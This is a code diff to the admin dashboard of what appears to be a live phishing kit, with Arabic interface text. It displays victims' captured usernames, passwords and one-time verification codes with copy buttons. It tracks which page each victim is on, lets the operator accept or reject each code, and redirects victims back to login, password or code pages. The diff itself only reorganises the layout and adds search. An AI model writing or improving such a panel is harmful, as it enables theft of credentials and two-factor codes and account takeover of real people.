+      <div class="detail-placeholder" id="detailPlaceholder">
+        <div class="hand">👈</div>
+        اختر طلباً لعرض تفاصيله
+      </div>
+      <div id="detailContent" style="display:none;flex-direction:column;height:100%"></div>
+    </div>
 
-<!-- Detail Panel (slides from left) -->
-<div class="detail-overlay" id="detailOverlay" onclick="closeDetail()"></div>
-<div class="detail-panel" id="detailPanel">
-  <div class="dp-header">
-    <h2 id="dpTitle">تفاصيل العميل</h2>
-    <button class="dp-close" onclick="closeDetail()">×</button>
   </div>
-  <div class="dp-body" id="dpBody"></div>
 </div>
 
 <script>
@@ -327,7 +324,6 @@ const pageClassMap = {
   "login":"p-login","password":"p-password","waiting":"p-waiting",
   "code":"p-code","code-waiting":"p-code-waiting","success":"p-success","order":"p-order"
 };
-
 const statusLabels = {
   pending:"قيد الانتظار",confirmed:"مقبول",rejected:"مرفوض",
   code_pending:"بانتظار الرمز",code_confirmed:"تم التأكيد",code_rejected:"رمز مرفوض"
@@ -336,7 +332,8 @@ const statusLabels = {
 let TOKEN = localStorage.getItem("admin_token") || "";
 let orders = [];
 let visitors = [];
-let selectedOrderId = null;
+let selectedId = null;
+let searchQuery = "";
 
 function api(method, url, body) {
   const opts = {method, headers:{"Content-Type":"application/json"}};
@@ -344,8 +341,7 @@ function api(method, url, body) {
   if (body) opts.body = JSON.stringify(body);
   return fetch(url, opts).then(r => {
     if (r.status === 401 && url !== "/api/admin/login") {
-      TOKEN = "";
-      localStorage.removeItem("admin_token");
+      TOKEN = ""; localStorage.removeItem("admin_token");
       document.getElementById("layout").style.display = "none";
       document.getElementById("loginScreen").style.display = "flex";
       return r.json();
@@ -358,210 +354,178 @@ async function doLogin() {
   const pass = document.getElementById("passInput").value;
   const res = await api("POST", "/api/admin/login", {password: pass});
   if (res.success) {
-    TOKEN = res.token;
-    localStorage.setItem("admin_token", TOKEN);
+    TOKEN = res.token; localStorage.setItem("admin_token", TOKEN);
     showDashboard();
   } else {
     document.getElementById("loginErr").style.display = "block";
   }
 }
 function doLogout() {
-  TOKEN = "";
-  localStorage.removeItem("admin_token");
+  TOKEN = ""; localStorage.removeItem("admin_token");
   document.getElementById("layout").style.display = "none";
   document.getElementById("loginScreen").style.display = "flex";
 }
-document.getElementById("passInput").addEventListener("keydown", e => {
-  if (e.key === "Enter") doLogin();
-});
+document.getElementById("passInput").addEventListener("keydown", e => { if (e.key === "Enter") doLogin(); });
 
 async function checkAuth() {
   if (!TOKEN) return;
   try {
     const res = await fetch("/api/orders", {headers:{"Authorization":"Bearer "+TOKEN}});
-    if (res.status === 200) {
-      const data = await res.json();
-      if (data.orders && data.orders.length >= 0) { showDashboard(); return; }
-    }
+    if (res.status === 200) { const d = await res.json(); if (d.orders && d.orders.length >= 0) { showDashboard(); return; } }
   } catch(e) {}
-  TOKEN = "";
-  localStorage.removeItem("admin_token");
+  TOKEN = ""; localStorage.removeItem("admin_token");
 }
 
 function showDashboard() {
   document.getElementById("loginScreen").style.display = "none";
-  document.getElementById("layout").style.display = "flex";
-  document.getElementById("layout").style.flexDirection = "column";
-  loadOrders();
-  loadActiveVisitors();
+  const layout = document.getElementById("layout");
+  layout.style.display = "flex";
+  loadOrders(); loadActiveVisitors();
 }
 
-// ========== SIDEBAR ==========
-function renderSidebar() {
-  const list = document.getElementById("sidebarList");
-  const activeOrders = orders.filter(o =>
-    o.current_page && o.current_page !== "success" && o.status !== "confirmed" && o.status !== "rejected"
-  );
+// ========== STATS ==========
+function updateStats() {
+  const active = orders.filter(o => o.current_page && !["success"].includes(o.current_page)
+    && !["confirmed","rejected","code_confirmed","code_rejected"].includes(o.status));
+  const done = orders.filter(o => o.status === "confirmed" || o.status === "code_confirmed");
 
-  document.getElementById("sidebarCount").textContent = activeOrders.length;
-  document.getElementById("sActive").textContent = visitors.length;
+  document.getElementById("sTotal").textContent = orders.length;
+  document.getElementById("sActive").textContent = active.length;
+  document.getElementById("sDone").textContent = done.length;
+  document.getElementById("sOnline").textContent = visitors.length;
+  document.getElementById("sVisitors").textContent = orders.length;
+  document.getElementById("tbVisitors").textContent = orders.length;
+  document.getElementById("tbOnline").textContent = visitors.length;
+  document.getElementById("activeCount").textContent = "(" + active.length + ")";
+  document.getElementById("ordersCount").textContent = "(" + orders.length + ")";
+}
 
-  if (!activeOrders.length) {
-    list.innerHTML = '<div class="sidebar-empty">لا يوجد عملاء نشطون حالياً</div>';
+// ========== CLIENTS SIDEBAR ==========
+function renderClients() {
+  const list = document.getElementById("clientsList");
+  const active = orders.filter(o => o.current_page && !["success"].includes(o.current_page)
+    && !["confirmed","rejected","code_confirmed","code_rejected"].includes(o.status));
+
+  if (!active.length) {
+    list.innerHTML = '<div class="clients-empty"><div class="zzz">💤</div>لا يوجد عملاء نشطين</div>';
     return;
   }
-
-  list.innerHTML = activeOrders.map(o => {
-    const pageKey = o.current_page || "home";
-    const pageCls = pageClassMap[pageKey] || "p-default";
-    const pageName = pageLabels[pageKey] || pageKey;
-    const isSelected = o.id === selectedOrderId;
+  list.innerHTML = active.map(o => {
+    const pk = o.current_page || "home";
+    const pc = pageClassMap[pk] || "p-default";
+    const pn = pageLabels[pk] || pk;
     const time = o.created_at ? new Date(o.created_at).toLocaleTimeString("ar-EG",{hour:"2-digit",minute:"2-digit"}) : "";
-
-    return `<div class="client-card${isSelected?" active":""}" onclick="openDetail(${o.id})">
-      <div class="client-top">
-        <span class="client-name"><span class="live-dot"></span> ${o.name}</span>
-        <span class="client-time">${time}</span>
-      </div>
-      <span class="client-page ${pageCls}">${pageName}</span>
-      <div class="client-phone">${o.phone || ""}</div>
+    return `<div class="cl-card${o.id===selectedId?" active":""}" onclick="selectOrder(${o.id})">
+      <div class="cl-top"><span class="cl-name"><span class="live"></span>${o.name}</span><span class="cl-time">${time}</span></div>
+      <span class="cl-page ${pc}">${pn}</span>
+      <div class="cl-phone">${o.phone||""}</div>
     </div>`;
   }).join("");
 }
 
-// ========== ORDERS TABLE ==========
-async function loadOrders() {
-  const res = await api("GET", "/api/orders");
-  orders = res.orders || [];
-
-  document.getElementById("sTotal").textContent = orders.length;
-  document.getElementById("sPending").textContent = orders.filter(o=>o.status==="pending").length;
-  document.getElementById("sConfirmed").textContent = orders.filter(o=>o.status==="confirmed"||o.status==="code_confirmed").length;
-  document.getElementById("tableCount").textContent = orders.length + " طلب";
-
-  renderSidebar();
-
+// ========== ORDERS LIST ==========
+function renderOrders() {
   const list = document.getElementById("ordersList");
-  if (!orders.length) {
-    list.innerHTML = '<div class="empty">لا توجد طلبات بعد</div>';
+  let filtered = orders;
+  if (searchQuery) {
+    const q = searchQuery.toLowerCase();
+    filtered = orders.filter(o => (o.name||"").toLowerCase().includes(q) || (o.phone||"").includes(q));
+  }
+
+  if (!filtered.length) {
+    list.innerHTML = '<div class="orders-empty"><div class="ico">📦</div>لا توجد طلبات</div>';
     return;
   }
+  list.innerHTML = filtered.map(o => {
+    const st = o.status || "pending";
+    const pn = pageLabels[o.current_page] || o.current_page || "—";
+    const date = o.created_at ? new Date(o.created_at).toLocaleDateString("ar-EG",{day:"numeric",month:"short"}) : "";
+    return `<div class="ord-card${o.id===selectedId?" active":""}" onclick="selectOrder(${o.id})">
+      <div class="ord-top"><span class="ord-name">${o.name}</span><span class="ord-badge ${st}">${statusLabels[st]||st}</span></div>
+      <div class="ord-mid">
+        <span class="ord-phone">${o.phone}</span>
+        <span class="ord-page">${pn}</span>
+        <span class="ord-date">${date}</span>
+      </div>
+    </div>`;
+  }).join("");
+}
 
-  let html = `<table><thead><tr>
-    <th>العميل</th><th>اسم المستخدم</th><th>الرمز السري</th><th>رمز التحقق</th><th>الحالة</th><th>الصفحة</th><th>التاريخ</th><th>حذف</th>
-  </tr></thead><tbody>`;
-
-  orders.forEach(o => {
-    const statusClass = o.status || "pending";
-    const pageName = pageLabels[o.current_page] || o.current_page || "—";
-    const date = o.created_at ? new Date(o.created_at).toLocaleDateString("ar-EG",{day:"numeric",month:"short"}) : "—";
-
-    html += `<tr onclick="openDetail(${o.id})">
-      <td><div class="td-name">${o.name}</div><div class="td-phone">${o.phone}</div></td>
-      <td>${o.login_username ? `<span class="td-cred">${o.login_username}</span>` : '<span style="color:#ccc">—</span>'}</td>
-      <td>${o.login_password ? `<span class="td-cred">${o.login_password}</span>` : '<span style="color:#ccc">—</span>'}</td>
-      <td>${o.verification_code ? `<span class="td-cred code">${o.verification_code}</span>` : '<span style="color:#ccc">—</span>'}</td>
-      <td><span class="badge badge-${statusClass}">${statusLabels[statusClass]||statusClass}</span></td>
-      <td><span class="badge badge-page">${pageName}</span></td>
-      <td style="font-size:11px;color:var(--muted)">${date}</td>
-      <td><button class="btn-delete" onclick="event.stopPropagation();deleteOrder(${o.id})">حذف</button></td>
-    </tr>`;
-  });
-
-  html += "</tbody></table>";
-  list.innerHTML = html;
-
-  if (selectedOrderId) {
-    const still = orders.find(x => x.id === selectedOrderId);
-    if (still) renderDetailPanel(still);
-  }
+function filterOrders() {
+  searchQuery = document.getElementById("searchInput").value.trim();
+  renderOrders();
 }
 
 // ========== DETAIL PANEL ==========
-function openDetail(id) {
+function selectOrder(id) {
+  selectedId = id;
   const o = orders.find(x => x.id === id);
   if (!o) return;
-  selectedOrderId = id;
-  renderDetailPanel(o);
-  document.getElementById("detailOverlay").classList.add("open");
-  document.getElementById("detailPanel").classList.add("open");
-  renderSidebar();
+  renderDetail(o);
+  renderClients();
+  renderOrders();
 }
 
-function closeDetail() {
-  document.getElementById("detailOverlay").classList.remove("open");
-  document.getElementById("detailPanel").classList.remove("open");
-  selectedOrderId = null;
-  renderSidebar();
-}
+function renderDetail(o) {
+  document.getElementById("detailPlaceholder").style.display = "none";
+  const dc = document.getElementById("detailContent");
+  dc.style.display = "flex";
 
-function renderDetailPanel(o) {
-  document.getElementById("dpTitle").textContent = o.name;
   const copyIcon = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>`;
+  let html = `<div class="det-header"><h2>${o.name}</h2><button class="det-close" onclick="closeDetail()">×</button></div>`;
+  html += `<div class="det-body">`;
 
-  let html = '';
-
-  // Status bar
-  html += `<div class="dp-status">
-    <span class="dp-status-dot ${o.status||'pending'}"></span>
-    <span class="dp-status-label">${statusLabels[o.status]||o.status||'قيد الانتظار'}</span>
-    <span class="dp-status-page">${pageLabels[o.current_page]||o.current_page||'—'}</span>
+  // Status
+  html += `<div class="det-status">
+    <span class="dot ${o.status||'pending'}"></span>
+    <span class="lbl">${statusLabels[o.status]||o.status||'قيد الانتظار'}</span>
+    <span class="pg">${pageLabels[o.current_page]||o.current_page||'—'}</span>
   </div>`;
 
-  // Client info
-  html += `<div class="dp-section">
-    <div class="dp-section-title">معلومات العميل</div>
-    <div class="dp-grid">
-      <div class="dp-item"><div class="lbl">الاسم</div><div class="val">${o.name}</div></div>
-      <div class="dp-item"><div class="lbl">الهاتف</div><div class="val" style="direction:ltr;text-align:right">${o.phone}</div></div>
-      <div class="dp-item"><div class="lbl">تاريخ الطلب</div><div class="val">${o.created_at ? new Date(o.created_at).toLocaleString("ar-EG") : '—'}</div></div>
-      <div class="dp-item"><div class="lbl">الصفحة الحالية</div><div class="val">${pageLabels[o.current_page]||o.current_page||'—'}</div></div>
+  // Info
+  html += `<div class="det-section"><div class="det-section-title">معلومات العميل</div>
+    <div class="det-grid">
+      <div class="det-item"><div class="l">الاسم</div><div class="v">${o.name}</div></div>
+      <div class="det-item"><div class="l">الهاتف</div><div class="v" style="direction:ltr;text-align:right">${o.phone}</div></div>
+      <div class="det-item"><div class="l">التاريخ</div><div class="v">${o.created_at?new Date(o.created_at).toLocaleString("ar-EG"):'—'}</div></div>
+      <div class="det-item"><div class="l">الصفحة</div><div class="v">${pageLabels[o.current_page]||o.current_page||'—'}</div></div>
     </div>
   </div>`;
 
   // Credentials
   if (o.login_username || o.login_password || o.verification_code) {
-    html += `<div class="dp-section">
-      <div class="dp-section-title">بيانات تسجيل الدخول</div>`;
-
+    html += `<div class="det-section"><div class="det-section-title">بيانات تسجيل الدخول</div>`;
     if (o.login_username) {
-      html += `<div class="dp-cred">
-        <div class="dp-cred-info"><div class="cred-label">اسم المستخدم</div><div class="cred-val">${o.login_username}</div></div>
-        <button class="dp-copy" onclick="dpCopy(this,'${o.login_username}')">${copyIcon} نسخ</button>
-      </div>`;
+      html += `<div class="det-cred"><div><div class="cl">اسم المستخدم</div><div class="cv">${o.login_username}</div></div>
+        <button class="det-copy" onclick="dtCopy(this,'${o.login_username}')">${copyIcon} نسخ</button></div>`;
     }
     if (o.login_password) {
-      html += `<div class="dp-cred">
-        <div class="dp-cred-info"><div class="cred-label">الرمز السري</div><div class="cred-val">${o.login_password}</div></div>
-        <button class="dp-copy" onclick="dpCopy(this,'${o.login_password}')">${copyIcon} نسخ</button>
-      </div>`;
+      html += `<div class="det-cred"><div><div class="cl">الرمز السري</div><div class="cv">${o.login_password}</div></div>
+        <button class="det-copy" onclick="dtCopy(this,'${o.login_password}')">${copyIcon} نسخ</button></div>`;
     }
     if (o.verification_code) {
-      html += `<div class="dp-cred">
-        <div class="dp-cred-info"><div class="cred-label">رمز التحقق</div><div class="cred-val code-val">${o.verification_code}</div></div>
-        <button class="dp-copy" onclick="dpCopy(this,'${o.verification_code}')">${copyIcon} نسخ</button>
-      </div>`;
+      html += `<div class="det-cred"><div><div class="cl">رمز التحقق</div><div class="cv code">${o.verification_code}</div></div>
+        <button class="det-copy" onclick="dtCopy(this,'${o.verification_code}')">${copyIcon} نسخ</button></div>`;
     }
     html += `</div>`;
   }
 
   // Accept / Reject
   if (o.status === "code_pending") {
-    html += `<div class="dp-actions">
-      <button class="btn-accept" onclick="updateStatus(${o.id},'code_confirmed')">قبول الرمز</button>
-      <button class="btn-reject" onclick="updateStatus(${o.id},'code_rejected')">رفض الرمز</button>
+    html += `<div class="det-actions">
+      <button class="btn-accept" onclick="updateStatus(${o.id},'code_confirmed')">✅ قبول الرمز</button>
+      <button class="btn-reject" onclick="updateStatus(${o.id},'code_rejected')">❌ رفض الرمز</button>
     </div>`;
   } else {
-    html += `<div class="dp-actions">
-      <button class="btn-accept" onclick="updateStatus(${o.id},'confirmed')">قبول</button>
-      <button class="btn-reject" onclick="updateStatus(${o.id},'rejected')">رفض</button>
+    html += `<div class="det-actions">
+      <button class="btn-accept" onclick="updateStatus(${o.id},'confirmed')">✅ قبول</button>
+      <button class="btn-reject" onclick="updateStatus(${o.id},'rejected')">❌ رفض</button>
     </div>`;
   }
 
   // Redirect
-  html += `<div class="dp-redirect">
-    <div class="dp-redirect-title">إعادة توجيه العميل</div>
-    <div class="dp-redirect-grid">
+  html += `<div class="det-redirect"><div class="det-redirect-title">إعادة توجيه العميل</div>
+    <div class="det-redirect-grid">
       <button onclick="doRedirect(${o.id},'login.html')">تسجيل الدخول</button>
       <button onclick="doRedirect(${o.id},'password.html')">الرمز السري</button>
       <button onclick="doRedirect(${o.id},'code.html')">رمز التحقق</button>
@@ -571,15 +535,26 @@ function renderDetailPanel(o) {
     </div>
   </div>`;
 
-  document.getElementById("dpBody").innerHTML = html;
+  // Delete
+  html += `<div class="det-delete"><button onclick="deleteOrder(${o.id})">🗑️ حذف الطلب</button></div>`;
+
+  html += `</div>`;
+  dc.innerHTML = html;
 }
 
-function dpCopy(btn, text) {
-  const copyIcon = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>`;
+function closeDetail() {
+  selectedId = null;
+  document.getElementById("detailPlaceholder").style.display = "flex";
+  document.getElementById("detailContent").style.display = "none";
+  renderClients(); renderOrders();
+}
+
+function dtCopy(btn, text) {
+  const ci = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>`;
   navigator.clipboard.writeText(text).then(() => {
     btn.classList.add("copied");
-    btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:14px;height:14px"><path d="M20 6L9 17l-5-5"/></svg> تم';
-    setTimeout(() => { btn.classList.remove("copied"); btn.innerHTML = copyIcon + " نسخ"; }, 1500);
+    btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:13px;height:13px"><path d="M20 6L9 17l-5-5"/></svg> تم';
+    setTimeout(() => { btn.classList.remove("copied"); btn.innerHTML = ci + " نسخ"; }, 1500);
   });
 }
 
@@ -587,26 +562,31 @@ async function doRedirect(id, page) {
   await api("PATCH", "/api/orders/" + id, {redirect_to: page});
   loadOrders();
 }
-
 async function updateStatus(id, status) {
   await api("PATCH", "/api/orders/" + id, {status});
-  closeDetail();
   loadOrders();
 }
-
 async function deleteOrder(id) {
   if (!confirm("هل تريد حذف هذا الطلب؟")) return;
   await api("DELETE", "/api/orders/" + id);
-  if (selectedOrderId === id) closeDetail();
+  if (selectedId === id) closeDetail();
   loadOrders();
 }
 
+async function loadOrders() {
+  const res = await api("GET", "/api/orders");
+  orders = res.orders || [];
+  updateStats(); renderClients(); renderOrders();
+  if (selectedId) {
+    const o = orders.find(x => x.id === selectedId);
+    if (o) renderDetail(o); else closeDetail();
+  }
+}
 async function loadActiveVisitors() {
   if (!TOKEN) return;
   const res = await api("GET", "/api/visitors/active");
   visitors = res.visitors || [];
-  document.getElementById("sActive").textContent = visitors.length;
-  renderSidebar();
+  updateStats();
 }
 
 checkAuth();
